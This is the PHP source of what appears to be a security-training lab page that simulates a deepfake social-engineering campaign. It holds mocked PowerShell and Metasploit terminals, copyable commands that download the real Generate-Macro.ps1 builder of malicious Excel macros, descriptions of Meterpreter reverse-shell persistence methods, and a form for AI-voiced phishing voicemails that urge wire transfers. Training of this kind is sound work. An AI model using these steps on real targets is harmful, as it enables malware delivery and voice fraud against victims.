<?php
declare(strict_types=1);

require_once __DIR__ . '/../includes/bootstrap.php';

require_login();

const CONSOLE_STATE_KEY = 'mission_console';
const PAYLOAD_CONSOLE_KEY = 'payload_console';
const PAYLOAD_REQUIRED_IP = '35.233.136.83';
const PAYLOAD_IWR_URI = 'https://raw.githubusercontent.com/enigma0x3/Generate-Macro/refs/heads/master/Generate-Macro.ps1';
const LISTENER_STATE_KEY = 'listener_console';
const LISTENER_SHELL_PROMPT = '└─$ ';
const LISTENER_SHELL_HEADER = '┌──(kali㉿kali)-[~/Downloads/Generate-Macro]';
const LISTENER_MSF_PROMPT = 'msf > ';
const LISTENER_MSF_EXPLOIT_PROMPT = 'msf exploit(multi/handler) > ';

function normalize_terminal_output(string $text): string
{
    $text = str_replace("\r\n", "\n", $text);
    $text = str_replace("\r", "\n", $text);
    return str_replace("\n", "\r\n", $text);
}

function payload_macro_template(): array
{
    return [
        'active' => false,
        'step' => null,
        'inputs' => [
            'ip' => null,
            'port' => null,
            'doc' => null,
            'attack' => null,
            'payload' => null,
        ],
    ];
}

function payload_macro_source(): string
{
    return <<<'MACRO'
#Coded by Matt Nelson (@enigma0x3)
<#
.SYNOPSIS
Standalone Powershell script that will generate a malicious Microsoft Office document with a specified payload and persistence method

.DESCRIPTION
This script will generate malicious Microsoft Excel Documents that contain VBA macros. This script will prompt you for your attacking IP 
(the one you will receive your shell at), the port you want your shell at, and the name of the document. From there, the script will then
display a menu of different attacks, all with different persistence methods. Once an attack is chosen, it will then prompt you for your payload type
(Only HTTP and HTTPS are supported).

When naming the document, don't include a file extension.

These attacks use Invoke-Shellcode, which was created by Matt Graeber. Follow him on Twitter --> @mattifestation

PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None


.Attack Types
Meterpreter Shell with Logon Persistence: This attack delivers a meterpreter shell and then persists in the registry 
by creating a hidden .vbs file in C:\Users\Public and then creates a registry key in HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
that executes the .vbs file on login.

Meterpreter Shell with Powershell Profile Persistence: This attack requires the target user to have admin right but is quite creative. It will
deliver you a shell and then drop a malicious .vbs file in C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs. Once dropped, it creates
an infected Powershell Profile file in C:\Windows\SysNative\WindowsPowerShell\v1.0\ and then creates a registry key in 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load that executes Powershell.exe on startup. Since the Powershell profile loads automatically when 
Powershell.exe is invoked, your code is executed automatically.

Meterpreter Shell with Alternate Data Stream Persistence: This attack will give you a shell and then persists my creating 2 alternate data streams attached to the AppData
folder. It then creates a registry key that parses the Alternate Data Streams and runs the Base64 encoded payload.

Meterpreter Shell with Scheduled Task Persistence: This attack will give you a shell and then persist by creating a scheduled task with the action set to
the set payload. 


.EXAMPLE
PS> ./Generate-Macro.ps1
Enter IP Address: 10.0.0.10
Enter Port Number: 1111
Enter the name of the document (Do not include a file extension): FinancialData

--------Select Attack---------
1. Meterpreter Shell with Logon Persistence
2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
3. Meterpreter Shell with Alternate Data Stream Persistence
4. Meterpreter Shell with Scheduled Task Persistence
------------------------------
Select Attack Number & Press Enter: 1

--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------
Select Payload Number & Press Enter: 1
Saved to file C:\Users\Malware\Desktop\FinancialData.xls
PS>
MACRO;
}

function payload_prompt_for_step(?string $step): ?string
{
    return match ($step) {
        'ip' => 'Enter IP Address: ',
        'port' => 'Enter Port Number: ',
        'doc' => 'Enter the name of the document (Do not include a file extension): ',
        'attack' => 'Select Attack Number & Press Enter: ',
        'payload' => 'Select Payload Number & Press Enter: ',
        default => null,
    };
}

function console_default_state(): array
{
    return [
        'cwd' => '/',
        'missions_unlocked' => 0,
        'intel_flag' => false,
    ];
}

function console_state(): array
{
    if (!isset($_SESSION[CONSOLE_STATE_KEY])) {
        $_SESSION[CONSOLE_STATE_KEY] = console_default_state();
    }

    return $_SESSION[CONSOLE_STATE_KEY];
}

function console_save_state(array $state): void
{
    $_SESSION[CONSOLE_STATE_KEY] = $state;
}

function console_reset(): array
{
    $state = console_default_state();
    console_save_state($state);
    return $state;
}

function payload_default_state(): array
{
    return [
        'cwd' => 'C:\\Users\\Deep\\Desktop',
        'files' => ['Readme.txt'],
        'downloaded' => false,
        'download_name' => null,
        'macro' => payload_macro_template(),
        'trojan' => null,
        'complete' => false,
    ];
}

function payload_state(): array
{
    if (!isset($_SESSION[PAYLOAD_CONSOLE_KEY])) {
        $_SESSION[PAYLOAD_CONSOLE_KEY] = payload_default_state();
    }

    return $_SESSION[PAYLOAD_CONSOLE_KEY];
}

function payload_save_state(array $state): void
{
    $_SESSION[PAYLOAD_CONSOLE_KEY] = $state;
}

function payload_reset(): array
{
    $state = payload_default_state();
    payload_save_state($state);
    return $state;
}

function listener_default_state(): array
{
    return [
        'msf_active' => false,
        'msf_context' => 'shell',
        'lhost' => '',
        'lport' => '4444',
        'handler_waiting' => false,
        'bind_host' => null,
    ];
}

function listener_state(): array
{
    if (!isset($_SESSION[LISTENER_STATE_KEY]) || !is_array($_SESSION[LISTENER_STATE_KEY])) {
        $_SESSION[LISTENER_STATE_KEY] = listener_default_state();
    }

    return $_SESSION[LISTENER_STATE_KEY];
}

function listener_save_state(array $state): void
{
    $_SESSION[LISTENER_STATE_KEY] = $state;
}

function listener_reset(): array
{
    $state = listener_default_state();
    listener_save_state($state);
    return $state;
}

function listener_shell_error(string $command): string
{
    $token = trim(strtok($command, " \t")) ?: trim($command);
    if ($token === '') {
        $token = 'command';
    }
    return "{$token}: command not found";
}

function listener_is_msf_command(string $command): bool
{
    $trimmed = trim($command);
    if ($trimmed === '') {
        return false;
    }

    $lower = strtolower($trimmed);
    $directMatches = [
        'use',
        'options',
        'info',
        'info -d',
        'run',
        'exploit',
        'help',
        'exit',
    ];

    foreach ($directMatches as $match) {
        if ($lower === $match) {
            return true;
        }
    }

    $prefixMatches = [
        'use ',
        'set ',
        'info ',
    ];

    foreach ($prefixMatches as $prefix) {
        if (str_starts_with($lower, $prefix)) {
            return true;
        }
    }

    return false;
}

function listener_current_prompt(array $state): string
{
    if (!($state['msf_active'] ?? false)) {
        return LISTENER_SHELL_PROMPT;
    }

    return ($state['msf_context'] ?? 'root') === 'exploit'
        ? LISTENER_MSF_EXPLOIT_PROMPT
        : LISTENER_MSF_PROMPT;
}

function listener_info_text(): string
{
    return <<<'INFO'
       Name: Generic Payload Handler
     Module: exploit/multi/handler
   Platform: Android, Apple_iOS, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi
       Arch: x86, x86_64, x64, mips, mipsle, mipsbe, mips64, mips64le, ppc, ppce500v2, ppc64, ppc64le, cbea, cbea64, sparc, sparc64, armle, armbe, aarch64, cmd, php, tty, java, ruby, dalvik, python, nodejs, firefox, zarch, r, riscv32be, riscv32le, riscv64be, riscv64le, loongarch64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Manual

Provided by:
  hdm <x@hdm.io>
  bcook-r7

Module side effects:
 unknown-side-effects

Module stability:
 unknown-stability

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Wildcard Target

Check supported:
  No

Payload information:
  Space: 10000000
  Avoid: 0 characters

Description:
  This module is a stub that provides all of the
  features of the Metasploit payload system to exploits
  that have been launched outside of the framework.

View the full module info with the info -d command.
INFO;
}

function listener_option_column(string $value, int $width = 15): string
{
    if ($value === '') {
        return str_repeat(' ', $width);
    }

    return str_pad($value, $width, ' ', STR_PAD_RIGHT);
}

function listener_options_text(array $state): string
{
    $host = listener_option_column($state['lhost'] ?? '');
    $port = listener_option_column($state['lport'] ?? '4444');

    return <<<OPTS
                                                                                   
Payload options (generic/shell_reverse_tcp):                                       
                                                                                   
   Name   Current Setting  Required  Description                                   
   ----   ---------------  --------  -----------                                   
   LHOST  {$host}  yes       The listen address (an interface may be spec  
                                     ified)                                       
   LPORT  {$port}  yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.
OPTS;
}

function handle_console_command(string $command, array $state): array
{
    $command = trim($command);
    $output = '';
    $clear = false;

    if ($command === '') {
        return ['state' => $state, 'output' => '', 'clear' => false];
    }

    $rootFiles = [
        'README.txt',
        'intel',
        'logs',
    ];

    $intelFiles = [
        'ops_report.txt',
        'payload.bin',
    ];

    $logFiles = [
        'beacon.log',
        'system.log',
    ];

    switch (true) {
        case $command === 'help':
            $output = "Available commands:
  help              Show this list
  ls / pwd          Inspect the simulated filesystem
  cd <dir>          Move between intel/ logs
  cat <file>        Read the contents of a file
  hint              Receive guidance from HQ
  reset             Restore the sandbox state
  clear             Wipe the terminal output";
            break;
        case $command === 'clear':
            $clear = true;
            $output = "Screen cleared.";
            break;
        case $command === 'reset':
            $state = console_reset();
            $output = "Sandbox reset. Starting from /";
            break;
        case $command === 'pwd':
            $output = $state['cwd'];
            break;
        case $command === 'ls':
            if ($state['cwd'] === '/') {
                $output = implode("\n", $rootFiles);
            } elseif ($state['cwd'] === '/intel') {
                $output = implode("\n", $intelFiles);
            } elseif ($state['cwd'] === '/logs') {
                $output = implode("\n", $logFiles);
            }
            break;
        case str_starts_with($command, 'cd'):
            $parts = preg_split('/\s+/', $command);
            $target = $parts[1] ?? '';
            if ($target === '' || $target === '/') {
                $state['cwd'] = '/';
                $output = 'Navigated to /';
            } elseif ($target === '..') {
                $state['cwd'] = '/';
                $output = 'Navigated to /';
            } elseif ($target === 'intel' || $target === '/intel') {
                $state['cwd'] = '/intel';
                $output = 'Navigated to /intel';
            } elseif ($target === 'logs' || $target === '/logs') {
                $state['cwd'] = '/logs';
                $output = 'Navigated to /logs';
            } else {
                $output = "cd: {$target}: No such directory";
            }
            break;
        case str_starts_with($command, 'cat'):
            $parts = preg_split('/\s+/', $command, 2);
            $file = $parts[1] ?? '';
            if ($file === '') {
                $output = 'Usage: cat <file>';
                break;
            }

            if ($state['cwd'] === '/' && strcasecmp($file, 'README.txt') === 0) {
                $output = ">>> NODE BRIEFING

Intercepted host is seeded with synthetic artifacts. Sweep directories intel/ and logs/ to find the signal phrase.";
            } elseif ($state['cwd'] === '/intel' && strcasecmp($file, 'ops_report.txt') === 0) {
                $output = "Field Team: Voice clone surfaced on executive bridge call.
Countermeasure: Deploy passphrase 'aurora vector' only after verifying multi-channel metadata.";
            } elseif ($state['cwd'] === '/intel' && strcasecmp($file, 'payload.bin') === 0) {
                $output = base64_encode('This is a harmless mock payload used for the exercise.');
            } elseif ($state['cwd'] === '/logs' && strcasecmp($file, 'beacon.log') === 0) {
                $state['intel_flag'] = true;
                $output = "[00:01] inbound-signal -> KEYWORD: AURORA VECTOR
[00:02] anomaly detected: request wire transfer
[00:03] action: escalate to human verification

## Mission Complete: You have identified the safeguard phrase.";
            } elseif ($state['cwd'] === '/logs' && strcasecmp($file, 'system.log') === 0) {
                $output = "systemd[1]: Starting synthetic comms recorder...
detector: probability of spoofed inflection spikes at 0.91";
            } else {
                $output = "cat: {$file}: No such file in {$state['cwd']}";
            }
            break;
        case $command === 'hint':
            if ($state['cwd'] === '/') {
                $output = 'Hint: pivot into intel/ first, then inspect logs/';
            } elseif ($state['cwd'] === '/intel') {
                $output = 'Hint: Copy the phrase from ops_report.txt and look for a confirmation inside logs/';
            } else {
                $output = 'Hint: Search for beacon activity. Anything referencing the keyword is valuable.';
            }
            break;
        default:
            $output = "bash: {$command}: command not found";
            break;
    }

    return ['state' => $state, 'output' => normalize_terminal_output($output), 'clear' => $clear];
}

function payload_handle_command(string $command, array $state): array
{
    $command = trim($command);
    $output = '';
    $clear = false;

    if ($command === '__CTRL_C__') {
        $state['macro'] = payload_macro_template();
        $output = '^C';
        return [
            'state' => $state,
            'output' => normalize_terminal_output($output),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => null,
            'awaiting_prompt' => false,
        ];
    }

    if ($state['macro']['active']) {
        return payload_handle_macro_input($command, $state);
    }

    if ($command === '') {
        return ['state' => $state, 'output' => '', 'clear' => false];
    }

    $promptText = null;

    switch (true) {
        case strcasecmp($command, 'help') === 0:
            $output = "Available commands:
  help                   Show this list
  ls / pwd               Inspect working directory
  ipconfig               Display adapter information
  Invoke-WebRequest      Download Generate-Macro.ps1
  .\\Generate-Macro.ps1  Launch the macro builder
  reset                  Restore the lab state
  clear | cls            Clear the screen";
            break;
        case in_array(strtolower($command), ['clear', 'cls'], true):
            $clear = true;
            $output = 'Screen cleared.';
            break;
        case strcasecmp($command, 'reset') === 0:
            $state = payload_reset();
            $output = 'Payload lab reset. Working directory restored.';
            break;
        case strcasecmp($command, 'pwd') === 0:
            $output = $state['cwd'];
            break;
        case preg_match('/^ls\b/i', $command) === 1:
            $files = $state['files'];
            $downloadName = $state['download_name'] ?? null;
            if ($state['downloaded'] && $downloadName && !in_array($downloadName, $files, true)) {
                $files[] = $downloadName;
            }
            if ($state['trojan']) {
                $files[] = $state['trojan'];
            }
            $files = array_values(array_unique($files));
            $state['files'] = $files;
            $output = implode("\n", $files);
            break;
        case strcasecmp($command, 'ipconfig') === 0:
            $output = <<<EOT

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::cc0f:abcd:ef12:3456%12
   IPv4 Address. . . . . . . . . . . : {PAYLOAD_REQUIRED_IP}
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 35.233.136.1
EOT;
            $output = str_replace('{PAYLOAD_REQUIRED_IP}', PAYLOAD_REQUIRED_IP, $output);
            break;
        case stripos($command, 'Invoke-WebRequest') === 0:
            $uriMatch = [];
            if (!preg_match('/-Uri\s+("?)([^"\s]+)\1/i', $command, $uriMatch)) {
                $output = 'Specify the source URI (example: -Uri ' . PAYLOAD_IWR_URI . ').';
                break;
            }
            if (strcasecmp($uriMatch[2], PAYLOAD_IWR_URI) !== 0) {
                $output = 'URI mismatch. Use ' . PAYLOAD_IWR_URI . ' to pull the approved builder.';
                break;
            }
            $outMatch = [];
            if (!preg_match('/-OutFile\s+("?)([^"\s]+)\1/i', $command, $outMatch)) {
                $output = 'Specify the output file (example: -OutFile .\Generate-Macro.ps1).';
                break;
            }
            $fileName = trim($outMatch[2]);
            $fileName = trim($fileName, '"\'');
            if (str_starts_with($fileName, '.\\') || str_starts_with($fileName, './')) {
                $fileName = substr($fileName, 2);
            }
            if ($fileName === '') {
                $fileName = 'Generate-Macro.ps1';
            }
            $state['downloaded'] = true;
            $state['download_name'] = $fileName;
            if (!in_array($fileName, $state['files'], true)) {
                $state['files'][] = $fileName;
            }
            $output = "{$state['cwd']}\\{$fileName} downloaded successfully.";
            break;
        case preg_match('/^\.\\\s*(.+)$/', $command, $invokeMatch) === 1:
            $scriptName = $state['download_name'] ?? 'Generate-Macro.ps1';
            $invoked = trim($invokeMatch[1], '"\'');
            if (!$state['downloaded']) {
                $output = 'Generate-Macro.ps1 is missing. Use Invoke-WebRequest to pull it down first.';
                break;
            }
            if ($invoked === '' || strcasecmp($invoked, $scriptName) !== 0) {
                $output = "File '{$invoked}' not found. Execute .\\{$scriptName}";
                break;
            }
            $state['macro'] = payload_macro_template();
            $state['macro']['active'] = true;
            $state['macro']['step'] = 'ip';
            $promptText = payload_prompt_for_step('ip');
            $output = '';
            break;
        case preg_match('/^(?:type|get-content|gc)\s+(.+)/i', $command, $typeMatch) === 1:
            $target = trim($typeMatch[1]);
            $target = trim($target, '"\'');
            if ($target === '') {
                $output = 'type : Cannot bind argument.';
                break;
            }
            $normalizedTarget = $target;
            if (str_starts_with(strtolower($normalizedTarget), '.\\')) {
                $normalizedTarget = substr($normalizedTarget, 2);
            }
            $files = array_values(array_unique(array_merge(
                $state['files'],
                array_filter([$state['download_name'] ?? null, $state['trojan'] ?? null])
            )));
            $state['files'] = $files;
            if (strcasecmp($normalizedTarget, 'Readme.txt') === 0) {
                $output = "Recon Checklist:\n - Confirm IP via ipconfig\n - Pull Generate-Macro.ps1\n - Run the builder.\n";
            } elseif ($state['downloaded'] && strcasecmp($normalizedTarget, ($state['download_name'] ?? 'Generate-Macro.ps1')) === 0) {
                $output = payload_macro_source();
            } elseif ($state['trojan'] && strcasecmp($normalizedTarget, $state['trojan']) === 0) {
                $output = "Binary contents of {$state['trojan']} are not viewable in this lab.";
            } else {
                $output = "type : Cannot find path '{$target}' because it does not exist.";
            }
            break;
        default:
            $output = "PS: '{$command}' is not recognized within this lab.";
            break;
    }

    return [
        'state' => $state,
        'output' => normalize_terminal_output($output),
        'clear' => $clear,
        'prompt_again' => false,
        'prompt_text' => $promptText,
        'awaiting_prompt' => $state['macro']['active'],
    ];
}

function payload_handle_macro_input(string $command, array $state): array
{
    $step = $state['macro']['step'];
    $output = '';
    $promptAgain = false;
    $promptText = null;

    switch ($step) {
        case 'ip':
            if ($command !== PAYLOAD_REQUIRED_IP) {
                $output = "Invalid IP. Run ipconfig and enter {$state['cwd']} host address:";
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['ip'] = $command;
            $state['macro']['step'] = 'port';
            $promptText = payload_prompt_for_step('port');
            $output = '';
            break;
        case 'port':
            if (!preg_match('/^\d{1,5}$/', $command)) {
                $output = 'Port must be numeric. Enter Port Number:';
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['port'] = $command;
            $state['macro']['step'] = 'doc';
            $promptText = payload_prompt_for_step('doc');
            $output = '';
            break;
        case 'doc':
            if ($command === '') {
                $output = 'Document name cannot be empty. Enter the name of the document (without extension):';
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['doc'] = $command;
            $state['macro']['step'] = 'attack';
            $output = "--------Select Attack---------\n1. Meterpreter Shell with Logon Persistence\n2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)\n3. Meterpreter Shell with Alternate Data Stream Persistence\n4. Meterpreter Shell with Scheduled Task Persistence\n------------------------------";
            $promptText = 'Select Attack Number & Press Enter: ';
            break;
        case 'attack':
            if (!in_array($command, ['1', '2', '3', '4'], true)) {
                $output = 'Select a valid attack option (1-4) and press Enter:';
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['attack'] = $command;
            $state['macro']['step'] = 'payload';
            $output = "--------Select Payload---------\n1. Meterpreter Reverse HTTPS\n2. Meterpreter Reverse HTTP\n------------------------------";
            $promptText = 'Select Payload Number & Press Enter: ';
            break;
        case 'payload':
            if (!in_array($command, ['1', '2'], true)) {
                $output = 'Select a valid payload option (1-2) and press Enter:';
                $promptAgain = true;
                $promptText = payload_prompt_for_step($step);
                break;
            }
            $state['macro']['inputs']['payload'] = $command;
            $doc = $state['macro']['inputs']['doc'];
            $filename = $doc . '.xls';
            $state['trojan'] = $filename;
            $state['macro'] = payload_macro_template();
            $state['complete'] = true;
            if (!in_array($filename, $state['files'], true)) {
                $state['files'][] = $filename;
            }
            $output = "Saved to file {$state['cwd']}\\{$filename}";
            break;
        default:
            $state['macro'] = payload_macro_template();
            $output = 'Macro builder aborted.';
            break;
    }

    return [
        'state' => $state,
        'output' => $output === '' ? '' : normalize_terminal_output($output),
        'clear' => false,
        'prompt_again' => $promptAgain,
        'prompt_text' => $promptText,
        'awaiting_prompt' => $state['macro']['active'],
    ];
}

function listener_handle_command(string $command, array $state): array
{
    $command = trim($command);
    $output = '';
    $clear = false;
    $awaitingPrompt = $state['handler_waiting'] ?? false;
    $promptText = $awaitingPrompt ? '' : listener_current_prompt($state);

    if ($command === '__CTRL_C__') {
        if ($state['handler_waiting'] ?? false) {
            $state['handler_waiting'] = false;
            $output = "^C[-] Exploit failed [user-interrupt]: Interrupt\n[-] run: Interrupted";
        } else {
            $output = '^C';
        }

        return [
            'state' => $state,
            'output' => normalize_terminal_output($output),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => listener_current_prompt($state),
            'awaiting_prompt' => false,
        ];
    }

    if ($command === '') {
        return [
            'state' => $state,
            'output' => '',
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => $awaitingPrompt ? '' : listener_current_prompt($state),
            'awaiting_prompt' => $awaitingPrompt,
        ];
    }

    $isMsfCommand = listener_is_msf_command($command);

    if (!($state['msf_active'] ?? false) && $isMsfCommand) {
        return [
            'state' => $state,
            'output' => normalize_terminal_output(listener_shell_error($command)),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => LISTENER_SHELL_PROMPT,
            'awaiting_prompt' => false,
        ];
    }

    if (!($state['msf_active'] ?? false)) {
        switch (true) {
            case in_array(strtolower($command), ['clear', 'cls'], true):
                $clear = true;
                $output = 'Screen cleared.';
                break;
            case strcasecmp($command, 'reset') === 0:
                $state = listener_reset();
                $output = 'Listener lab reset.';
                break;
            case strcasecmp($command, 'msfconsole') === 0:
                $state['msf_active'] = true;
                $state['msf_context'] = 'root';
                $state['handler_waiting'] = false;
                $promptText = LISTENER_MSF_PROMPT;
                break;
            default:
                $output = listener_shell_error($command);
                break;
        }

        return [
            'state' => $state,
            'output' => normalize_terminal_output($output),
            'clear' => $clear,
            'prompt_again' => false,
            'prompt_text' => $state['msf_active'] ? LISTENER_MSF_PROMPT : LISTENER_SHELL_PROMPT,
            'awaiting_prompt' => false,
        ];
    }

    if ($state['handler_waiting'] ?? false) {
        return [
            'state' => $state,
            'output' => normalize_terminal_output('Handler is waiting for a session. Press Ctrl+C to stop.'),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => '',
            'awaiting_prompt' => true,
        ];
    }

    $lower = strtolower($command);
    $moduleRequired = fn () => ($state['msf_context'] ?? 'root') === 'exploit';
    switch (true) {
        case $lower === 'help':
            $output = "Core commands:\n  use exploit/multi/handler\n  info\n  options\n  set LHOST <ip>\n  set LPORT <port>\n  run | exploit\n  exit";
            break;
        case $lower === 'details':
            $output = '[-] Unknown command: details. Run the help command for more details.';
            break;
        case $lower === 'info':
        case $lower === 'info -d':
            $output = listener_info_text();
            break;
        case $lower === 'options':
            if (!$moduleRequired()) {
                $output = "[-] Select a module first with: use exploit/multi/handler";
                break;
            }
            $output = listener_options_text($state);
            break;
        case $lower === 'use exploit/multi/handler':
            $state['msf_context'] = 'exploit';
            $output = '[*] Using configured payload generic/shell_reverse_tcp';
            $promptText = LISTENER_MSF_EXPLOIT_PROMPT;
            break;
        case preg_match('/^set\s+(lhost|lport)\s+(.+)$/i', $command, $matches) === 1:
            if (!$moduleRequired()) {
                $output = "[-] Select a module first with: use exploit/multi/handler";
                break;
            }
            $param = strtoupper($matches[1]);
            $value = trim($matches[2]);
            if ($param === 'LPORT' && !preg_match('/^\d{1,5}$/', $value)) {
                $output = 'LPORT must be numeric.';
                break;
            }
            if ($param === 'LHOST' && $value === '') {
                $output = 'LHOST cannot be empty.';
                break;
            }
            if ($param === 'LHOST') {
                $state['lhost'] = $value;
            } else {
                $state['lport'] = $value;
            }
            $output = "{$param} => {$value}";
            break;
        case in_array($lower, ['run', 'exploit'], true):
            if (!$moduleRequired()) {
                $output = "[-] Select a module first with: use exploit/multi/handler";
                break;
            }
            $result = listener_start_handler($state);
            return $result;
        case $lower === 'exit':
            $state['msf_active'] = false;
            $state['msf_context'] = 'shell';
            $state['handler_waiting'] = false;
            $output = '[*] Exiting msfconsole.';
            $promptText = LISTENER_SHELL_PROMPT;
            break;
        default:
            $output = "[-] Unknown command: {$command}. Run the help command for more details.";
            break;
    }

    return [
        'state' => $state,
        'output' => normalize_terminal_output($output),
        'clear' => $clear,
        'prompt_again' => false,
        'prompt_text' => $promptText,
        'awaiting_prompt' => false,
    ];
}

function listener_start_handler(array $state): array
{
    if (($state['lhost'] ?? '') === '' || ($state['lport'] ?? '') === '') {
        return [
            'state' => $state,
            'output' => normalize_terminal_output('[-] You must set LHOST and LPORT before starting the listener.'),
            'clear' => false,
            'prompt_again' => false,
            'prompt_text' => listener_current_prompt($state),
            'awaiting_prompt' => false,
        ];
    }

    $lines = [];
    if (($state['lhost'] ?? '') === PAYLOAD_REQUIRED_IP) {
        $lines[] = "[-] Handler failed to bind to {$state['lhost']}:{$state['lport']}: -  -";
        $state['bind_host'] = '0.0.0.0';
    } else {
        $state['bind_host'] = $state['lhost'];
    }
    $bind = $state['bind_host'] ?: '0.0.0.0';
    $lines[] = "[*] Started reverse TCP handler on {$bind}:{$state['lport']} ";
    $state['handler_waiting'] = true;

    return [
        'state' => $state,
        'output' => normalize_terminal_output(implode("\n", $lines)),
        'clear' => false,
        'prompt_again' => false,
        'prompt_text' => '',
        'awaiting_prompt' => true,
    ];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $command = $_POST['command'] ?? '';
    $target = $_POST['target'] ?? 'mission';
    if ($target === 'payload') {
        $state = payload_state();
        $result = payload_handle_command($command, $state);
        payload_save_state($result['state']);
    } elseif ($target === 'listener') {
        $state = listener_state();
        $result = listener_handle_command($command, $state);
        listener_save_state($result['state']);
    } else {
        $state = console_state();
        $result = handle_console_command($command, $state);
        console_save_state($result['state']);
    }

    echo json_encode([
        'output' => $result['output'],
        'clear' => $result['clear'],
        'prompt_again' => $result['prompt_again'] ?? false,
        'prompt_text' => $result['prompt_text'] ?? null,
        'awaiting_prompt' => $result['awaiting_prompt'] ?? false,
    ]);
    exit;
}

$state = console_state();
$payloadState = payload_state();
$voicePresets = $config['app']['tts_presets'] ?? [];
$defaultVoiceName = $config['app']['tts_voice']['name'] ?? '';
$defaultVoiceConfig = $config['app']['tts_voice'] ?? [];
$defaultPresetKey = null;
foreach ($voicePresets as $key => $preset) {
    if (!empty($preset['name']) && $preset['name'] === $defaultVoiceName) {
        $defaultPresetKey = $key;
        $defaultVoiceConfig = array_replace($defaultVoiceConfig, $preset);
        break;
    }
}
$defaultSpeakingRate = $defaultVoiceConfig['speaking_rate'] ?? 1.0;
$defaultPitch = $defaultVoiceConfig['pitch'] ?? 0.0;
$defaultEncoding = strtoupper($defaultVoiceConfig['audio_encoding'] ?? 'MP3');
$defaultEffectsProfile = $defaultVoiceConfig['effects_profile'] ?? 'telephony-class-application';

render_header('Simulation Lab');
?>
<section class="panel">
    <h1>Deepfake Social Engineering Simulation</h1>
    <p>
        This laboratory walks through the entire kill-chain of a synthetic social engineering campaign:
        weaponize a Trojan Excel payload using PowerShell tooling, then craft believable AI-generated voicemails
        to pressure the target into opening it. Completing both modules helps analysts rehearse the signals
        defenders look for when deepfake voice and malware delivery converge.
    </p>
</section>

<section class="panel payload-panel">
    <div>
        <h1>Prepare Payload</h1>
        <p>
            Craft the malicious spreadsheet that accompanies your social engineering narrative.
            Use this contained PowerShell environment to discover the host's public IP, fetch the
            <code>Generate-Macro.ps1</code> toolkit, and compile the trojan according to the briefing.
        </p>
        <ol>
            <li>
                Run
                <span class="copyable-command">
                    <code class="command-hint">ipconfig</code>
                    <button type="button" class="copy-cmd" data-command="ipconfig" aria-label="Copy ipconfig command">⧉</button>
                </span>
                to confirm the IPv4 address.
            </li>
            <li>
                Download the macro builder with
                <span class="copyable-command">
                    <code class="command-hint">Invoke-WebRequest -Uri <?= h(PAYLOAD_IWR_URI) ?> -OutFile .\Generate-Macro.ps1</code>
                    <button type="button" class="copy-cmd" data-command="Invoke-WebRequest -Uri <?= h(PAYLOAD_IWR_URI) ?> -OutFile .\Generate-Macro.ps1" aria-label="Copy Invoke-WebRequest command">⧉</button>
                </span>.
            </li>
            <li>
                Launch
                <span class="copyable-command">
                    <code class="command-hint">.\Generate-Macro.ps1</code>
                    <button type="button" class="copy-cmd" data-command=".\Generate-Macro.ps1" aria-label="Copy macro launch command">⧉</button>
                </span>
                and provide the IP, port, document name, attack, and payload selections.
            </li>
        </ol>
    </div>
    <div class="terminal-card">
        <div class="terminal-toolbar">
            <span class="indicator"></span>
            <span class="indicator yellow"></span>
            <span class="indicator green"></span>
            <span class="terminal-title">payload-node</span>
        </div>
        <div id="payload-terminal" class="terminal-window" aria-label="Payload terminal"></div>
    </div>
</section>

<section class="panel voicemail-card">
    <div>
        <h2>Generate Voicemail</h2>
        <p>
            Feed the AI voice actor with your own script to simulate phishing voicemails.
            We use Google Cloud Text-to-Speech, so make sure your account is permitted to call the API.
        </p>
    </div>
    <form id="voicemail-form" class="voicemail-form">
        <label for="voicemail-script">Voicemail transcript</label>
        <textarea id="voicemail-script" name="script" maxlength="1500" required placeholder="Example: This is Finance. I need that transfer executed in the next 15 minutes..."></textarea>
        <?php if ($voicePresets): ?>
            <label for="voicemail-voice">Voice model</label>
            <select id="voicemail-voice" name="voice_preset">
                <?php foreach ($voicePresets as $key => $preset): ?>
                    <?php
                    $selected = '';
                    if (!empty($preset['name']) && $preset['name'] === $defaultVoiceName) {
                        $selected = 'selected';
                    }
                    $presetRate = $preset['speaking_rate'] ?? $defaultSpeakingRate;
                    $presetPitch = $preset['pitch'] ?? $defaultPitch;
                    $presetEncoding = strtoupper($preset['audio_encoding'] ?? $defaultEncoding);
                    $presetEffects = $preset['effects_profile'] ?? $defaultEffectsProfile;
                    ?>
                    <option
                        value="<?= h($key) ?>"
                        data-description="<?= h($preset['label'] ?? $preset['name'] ?? $key) ?>"
                        data-rate="<?= h((string)$presetRate) ?>"
                        data-pitch="<?= h((string)$presetPitch) ?>"
                        data-encoding="<?= h($presetEncoding) ?>"
                        data-effects="<?= h($presetEffects) ?>"
                        <?= $selected ?>
                    >
                        <?= h($preset['label'] ?? $preset['name'] ?? $key) ?>
                    </option>
